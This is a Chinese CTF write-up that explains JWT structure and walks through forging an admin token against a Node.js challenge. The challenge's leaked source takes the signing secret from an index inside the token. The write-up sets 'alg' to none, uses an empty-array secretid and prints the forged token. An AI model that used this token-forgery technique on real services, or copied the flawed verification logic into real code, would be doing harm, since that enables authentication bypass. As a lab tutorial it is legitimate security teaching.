作者：Ch3ng 合天智汇

### 简单介绍一下什么是JWT  

Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[(RFC
7519](https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519)).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。

实际像这么一段数据

![v2-b3826bf37d02775b3f0bd3167d4f2585_720w](https://pic1.zhimg.com/80/v2-b3826bf37d02775b3f0bd3167d4f2585_720w.png)

这串数据以(.)作为分隔符分为三个部分，依次如下：

  * Header  

    
    
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 解码为 {   "alg": "HS256",   "typ": "JWT" }
    alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT

  * Payload  

    
    
    eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ 
    解码为
     {   "sub": "1234567890",   "name": "John Doe",   "iat": 1516239022 }
    JWT 规定了7个官方字段，供选用
    iss (issuer)：签发人
    exp (expiration time)：过期时间
    sub (subject)：主题
    aud (audience)：受众
    nbf (Not Before)：生效时间
    iat (Issued At)：签发时间
    jti (JWT ID)：编号

  * Signature  

Signature 部分是对前两部分的签名，防止数据篡改。

首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC
SHA256），按照下面的公式产生签名。

    
    
    HMACSHA256(   base64UrlEncode(header) + "." +   base64UrlEncode(payload),   secret )

算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。

### JWT安全问题一般有以下  

  1. 修改算法为none   

  2. 修改算法从RS256到HS256   

  3. 信息泄漏 密钥泄漏   

  4. 爆破密钥  

首先是一个登录框，我们先注册一个账号admin123，admin123

![v2-bf03b356f07bb3430f1883fc490b7edf_720w](https://pic3.zhimg.com/80/v2-bf03b356f07bb3430f1883fc490b7edf_720w.png)

看题目意思应该是想办法变成admin来登录

### 查看前端代码js/app.js  

    
    
    /** 
     *  或许该用 koa-static 来处理静态文件 
     *  路径该怎么配置？不管了先填个根目录XD 
     */  
     
    function login() {  
        const username = $("#username").val();  
        const password = $("#password").val();  
        const token = sessionStorage.getItem("token");  
        $.post("/api/login", {username, password, authorization:token})  
            .done(function(data) {  
                const {status} = data;  
                if(status) {  
                    document.location = "/home";  
                }  
            })  
            .fail(function(xhr, textStatus, errorThrown) {  
                alert(xhr.responseJSON.message);  
            });  
    }  
     
    function register() {  
        const username = $("#username").val();  
        const password = $("#password").val();  
        $.post("/api/register", {username, password})  
            .done(function(data) {  
                const { token } = data;  
                sessionStorage.setItem('token', token);  
                document.location = "/login";  
            })  
            .fail(function(xhr, textStatus, errorThrown) {  
                alert(xhr.responseJSON.message);  
            });  
    }  
     
    function logout() {  
        $.get('/api/logout').done(function(data) {  
            const {status} = data;  
            if(status) {  
                document.location = '/login';  
            }  
        });  
    }  
     
    function getflag() {  
        $.get('/api/flag').done(function(data) {  
            const {flag} = data;  
            $("#username").val(flag);  
        }).fail(function(xhr, textStatus, errorThrown) {  
            alert(xhr.responseJSON.message);  
        });  
    }  

根据注释符提示可以发现存在源码泄露问题

接着发现了源码泄漏

访问app.js，controller.js，rest.js即可得到源代码

关键代码controllers/api.js

    
    
    const crypto = require('crypto');  
     
    const fs = require('fs')  
     
    const jwt = require('jsonwebtoken')  
     
     
    const APIError = require('../rest').APIError;  
     
     
    module.exports = {  
     
        'POST /api/register': async (ctx, next) => {  
     
            const {username, password} = ctx.request.body;  
     
     
            if(!username || username === 'admin'){  
     
                throw new APIError('register error', 'wrong username');  
     
            }  
     
     
            if(global.secrets.length > 100000) {  
     
                global.secrets = [];  
     
            }  
     
     
            const secret = crypto.randomBytes(18).toString('hex');  
     
            const secretid = global.secrets.length;  
     
            global.secrets.push(secret)  
     
     
            const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});  
     
     
     
            ctx.rest({  
     
                token: token  
     
            });  
     
     
            await next();  
     
        },  
     
     
     
        'POST /api/login': async (ctx, next) => {  
     
            const {username, password} = ctx.request.body;  
     
     
            if(!username || !password) {  
     
                throw new APIError('login error', 'username or password is necessary');  
     
            }  
     
     
     
            const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;  
     
     
            const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;  
     
     
     
            console.log(sid)  
     
     
            if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {  
     
                throw new APIError('login error', 'no such secret id');  
     
            }  
     
     
            const secret = global.secrets[sid];  
     
     
            const user = jwt.verify(token, secret, {algorithm: 'HS256'});  
     
     
            const status = username === user.username && password === user.password;  
     
     
            if(status) {  
     
                ctx.session.username = username;  
     
            }  
     
     
            ctx.rest({  
     
                status  
     
            });  
     
     
            await next();  
     
        },  
     
     
        'GET /api/flag': async (ctx, next) => {  
     
            if(ctx.session.username !== 'admin'){  
     
                throw new APIError('permission error', 'permission denied');  
     
            }  
     
     
            const flag = fs.readFileSync('/flag').toString();  
     
            ctx.rest({  
     
                flag  
     
            });  
     
     
            await next();  
     
        },  
     
     
        'GET /api/logout': async (ctx, next) => {  
     
            ctx.session.username = null;  
     
            ctx.rest({  
     
                status: true  
     
            })  
     
            await next();  
     
        }  
     
    };  

尝试注册，可以看到在注册的时候生成了一个token，并存在sessionStorage中

![v2-e95a549c5fe05b2aadfb5f27ccd5b955_720w](https://pic2.zhimg.com/80/v2-e95a549c5fe05b2aadfb5f27ccd5b955_720w.png)

得到：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbjEyMyIsInBhc3N3b3JkIjoiYWRtaW4xMjMiLCJpYXQiOjE1ODczNzg4MjB9.o5ePpkaTQcSBxmOV-z6hBsWmvvbkd1a_C6Eu7Dpok4Q

解密得到：

![v2-44beee6a6d2df0d5d2704b471f38c739_720w](https://pic4.zhimg.com/80/v2-44beee6a6d2df0d5d2704b471f38c739_720w.png)

token生成过程

    
    
    const secret = crypto.randomBytes(18).toString('hex');  
    const secretid = global.secrets.length;  
    global.secrets.push(secret)  
    const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});  

看看各种条件，这里会先对sid进行验证，我们需要绕过这条认证，下面还有一个jwt.verify()的验证并赋值给user

    
    
    const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;  
    console.log(sid)  
    if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {  
        throw new APIError('login error', 'no such secret id');  
    }  
    const secret = global.secrets[sid];  
    const user = jwt.verify(token, secret, {algorithm: 'HS256'});  
    const status = username === user.username && password === user.password;  
    .....  
    ....  
    'GET /api/flag': async (ctx, next) => {  
        if(ctx.session.username !== 'admin'){  
            throw new APIError('permission error', 'permission denied');  
        }  

这里的密钥是生成了18位，基本没有爆破的可能性，我们使用的方法是将算法（alg）设置为none，接着我们需要让jwt.verify()验证中的secret为空，这里有个tricks

    
    
    $ node  
    > const secrets = [1,2,3,4]  
    undefined  
    > const sid = []  
    undefined  
    > const secret = secrets[sid]  
    undefined  
    > secret  
    undefined  

再看看能不能过条件

    
    
    const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
    运行结果
    > sid < secrets.length  
    true  
    > sid >= 0  
    true  
    我们将header修改
    原：  
    {  
      "alg": "HS256",  
      "typ": "JWT"  
    }  
    ===>  
    {  
      "alg": "none",  
      "typ": "JWT"  
    }  
    并加密为  
    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0  
    修改payload
    {  
      "secretid": 1,  
      "username": "admin123",  
      "password": "admin123",  
      "iat": 1587378820  
    }  
    ===>  
    {  
      "secretid": [],  
      "username": "admin",  
      "password": "admin123",  
      "iat": 1587378820  
    }  
    并加密为  
    eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluMTIzIiwiaWF0IjoxNTg3Mzc4ODIwfQ  

最后使用（.）进行拼接得到伪造的token

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluMTIzIiwiaWF0IjoxNTg3Mzc4ODIwfQ.

修改sessionStorage

![v2-02d1639eee548ebfc87bd3782ecc2447_720w](https://pic1.zhimg.com/80/v2-02d1639eee548ebfc87bd3782ecc2447_720w.png)

接着使用admin，admin123登录访问api/flag，即可得到flag

![v2-545dff0ffa69ff46453ce36e1245803c_720w](https://pic2.zhimg.com/80/v2-545dff0ffa69ff46453ce36e1245803c_720w.png)

参考：

<https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html>

<https://jwt.io/>

如果想更多系统的学习CTF，可点击<http://hetianlab.com/pages/CTFLaboratory.jsp>，进入CTF实验室学习，里面涵盖了6个题目类型系统的学习路径和实操环境。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

